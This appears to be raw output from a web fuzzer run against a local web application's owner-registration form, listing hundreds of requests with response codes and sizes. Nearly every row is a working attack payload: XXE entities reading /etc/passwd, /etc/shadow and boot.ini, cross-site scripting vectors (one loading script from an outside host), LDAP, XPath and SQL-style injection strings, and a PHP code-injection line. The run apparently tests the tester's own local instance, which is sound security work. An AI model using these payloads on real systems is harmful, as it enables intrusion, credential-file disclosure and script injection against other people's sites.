Target: http://localhost:8080/owners/new?firstName=FUZZ&lastName=FUZZ&address=FUZZ&city=FUZZ&telephone=FUZZ
Total requests: 468
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00028:  C=400     11 L	     136 W	   2206 Ch	  "\0\0\0 - \0\0\0 - \0\0\0 - \0\0\0 - \0\0\0"
00459:  C=400     11 L	     136 W	   4406 Ch	  "<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo> - <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo> - <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo> - <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo> - <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>"
00458:  C=400     11 L	     136 W	   3406 Ch	  "<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]> - <![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]> - <![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]> - <![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]> - <![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>"
00457:  C=400     11 L	     136 W	   2926 Ch	  "<![CDATA[<script>var n=0;while(true){n++;}</script>]]> - <![CDATA[<script>var n=0;while(true){n++;}</script>]]> - <![CDATA[<script>var n=0;while(true){n++;}</script>]]> - <![CDATA[<script>var n=0;while(true){n++;}</script>]]> - <![CDATA[<script>var n=0;while(true){n++;}</script>]]>"
00456:  C=400     11 L	     136 W	   2896 Ch	  "<name>','')); phpinfo(); exit;/*</name> - <name>','')); phpinfo(); exit;/*</name> - <name>','')); phpinfo(); exit;/*</name> - <name>','')); phpinfo(); exit;/*</name> - <name>','')); phpinfo(); exit;/*</name>"
00435:  C=200    174 L	     307 W	   5129 Ch	  "%2A%28%7C%28mail%3D%2A%29%29 - %2A%28%7C%28mail%3D%2A%29%29 - %2A%28%7C%28mail%3D%2A%29%29 - %2A%28%7C%28mail%3D%2A%29%29 - %2A%28%7C%28mail%3D%2A%29%29"
00439:  C=200    174 L	     307 W	   5129 Ch	  "%28 - %28 - %28 - %28 - %28"
00447:  C=200    174 L	     307 W	   5129 Ch	  "' or ''=' - ' or ''=' - ' or ''=' - ' or ''=' - ' or ''='"
00455:  C=200    174 L	     307 W	   5129 Ch	  "x' or name()='username' or 'x'='y - x' or name()='username' or 'x'='y - x' or name()='username' or 'x'='y - x' or name()='username' or 'x'='y - x' or name()='username' or 'x'='y"
00454:  C=200    174 L	     307 W	   5129 Ch	  "count(/child::node()) - count(/child::node()) - count(/child::node()) - count(/child::node()) - count(/child::node())"
00453:  C=200    174 L	     307 W	   5129 Ch	  "@* - @* - @* - @* - @*"
00451:  C=200    174 L	     307 W	   5129 Ch	  "//* - //* - //* - //* - //*"
00450:  C=200    174 L	     307 W	   5129 Ch	  "// - // - // - // - //"
00452:  C=200    174 L	     307 W	   5129 Ch	  "*/* - */* - */* - */* - */*"
00446:  C=200    174 L	     307 W	   5129 Ch	  "' or 1=1 or ''=' - ' or 1=1 or ''=' - ' or 1=1 or ''=' - ' or 1=1 or ''=' - ' or 1=1 or ''='"
00449:  C=200    174 L	     307 W	   5129 Ch	  "/ - / - / - / - /"
00448:  C=200    174 L	     307 W	   5129 Ch	  "x' or 1=1 or 'x'='y - x' or 1=1 or 'x'='y - x' or 1=1 or 'x'='y - x' or 1=1 or 'x'='y - x' or 1=1 or 'x'='y"
00445:  C=200    174 L	     307 W	   5129 Ch	  "%21 - %21 - %21 - %21 - %21"
00444:  C=200    174 L	     307 W	   5129 Ch	  "! - ! - ! - ! - !"
00443:  C=200    174 L	     307 W	   5129 Ch	  "%26 - %26 - %26 - %26 - %26"
00434:  C=400     11 L	     136 W	   2266 Ch	  "*(|(mail=*)) - *(|(mail=*)) - *(|(mail=*)) - *(|(mail=*)) - *(|(mail=*))"
00436:  C=400     11 L	     136 W	   2336 Ch	  "*(|(objectclass=*)) - *(|(objectclass=*)) - *(|(objectclass=*)) - *(|(objectclass=*)) - *(|(objectclass=*))"
00442:  C=200    174 L	     307 W	   5129 Ch	  "& - & - & - & - &"
00441:  C=200    174 L	     307 W	   5129 Ch	  "%29 - %29 - %29 - %29 - %29"
00438:  C=200    174 L	     307 W	   5129 Ch	  "( - ( - ( - ( - ("
00460:  C=400     11 L	     136 W	   3726 Ch	  "<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo> - <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo> - <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo> - <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo> - <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>"
00462:  C=400     11 L	     136 W	   4626 Ch	  "<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo> - <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo> - <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo> - <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo> - <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>"
00466:  C=400     11 L	     136 W	   2450 Ch	  "<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN> - <xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN> - <xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN> - <xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN> - <xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
00440:  C=200    174 L	     307 W	   5129 Ch	  ") - ) - ) - ) - )"
00437:  C=200    174 L	     307 W	   5129 Ch	  "%2A%28%7C%28objectclass%3D%2A%29%29 - %2A%28%7C%28objectclass%3D%2A%29%29 - %2A%28%7C%28objectclass%3D%2A%29%29 - %2A%28%7C%28objectclass%3D%2A%29%29 - %2A%28%7C%28objectclass%3D%2A%29%29"
00465:  C=400     11 L	     136 W	   3486 Ch	  "<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]> - <xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]> - <xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]> - <xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]> - <xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>"
00468:  C=400     11 L	     136 W	   4056 Ch	  "<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML> - <HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML> - <HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML> - <HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML> - <HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>"
00467:  C=400     11 L	     136 W	   2208 Ch	  "<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN> - <xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN> - <xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN> - <xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN> - <xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
00461:  C=400     11 L	     136 W	   4536 Ch	  "<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo> - <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo> - <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo> - <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo> - <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>"
00463:  C=400     11 L	     136 W	   4626 Ch	  "<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo> - <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo> - <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo> - <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo> - <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>"
00464:  C=400     11 L	     136 W	   4626 Ch	  "<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo> - <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo> - <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo> - <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo> - <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>"

Total time: 0
Processed Requests: 468
Filtered Requests: 0
Requests/sec.: 0
